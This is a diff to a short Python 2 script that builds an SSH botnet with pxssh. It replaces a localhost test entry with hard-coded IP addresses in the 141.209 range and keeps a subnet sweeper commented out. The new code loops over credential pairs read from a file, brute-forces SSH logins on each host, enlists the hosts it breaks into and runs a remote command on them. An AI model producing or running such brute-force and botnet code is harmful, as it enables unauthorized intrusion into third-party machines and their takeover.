@@ -1,6 +1,7 @@
 #!/usr/bin/python
 import pxssh
-import platform
+import PySweeper
+import sys
 
 class Client:
 
@@ -35,7 +36,22 @@ def addClient(host, user, password):
     botNet.append(client)
 
 botNet = []
-addClient('127.0.0.1', 'alexzoltowski', 'asldkf')
+#sweeper = PySweeper.PySweeper("141.209")
+#ips = sweeper.subnet(144)
+ips = ["141.209.48.202", "141.209.50.119"]
 
-#commands
-#sw_vers && uname -a for sys info
+with open('/etc/pass') as f:
+    credentials = [x.strip().split(':') for x in f.readlines()]
+
+for ip in ips:
+    for user, passwd in credentials:
+        print "trying ssh " + user + "@" + ip + " with passwd: " + passwd[:3]
+        client = Client(ip, user, passwd)
+        if client.session is None:
+            pass
+        else:
+            print "Connected to that bitch!"
+            botNet.append(client)
+            break
+
+botnetCommand("ls -la")
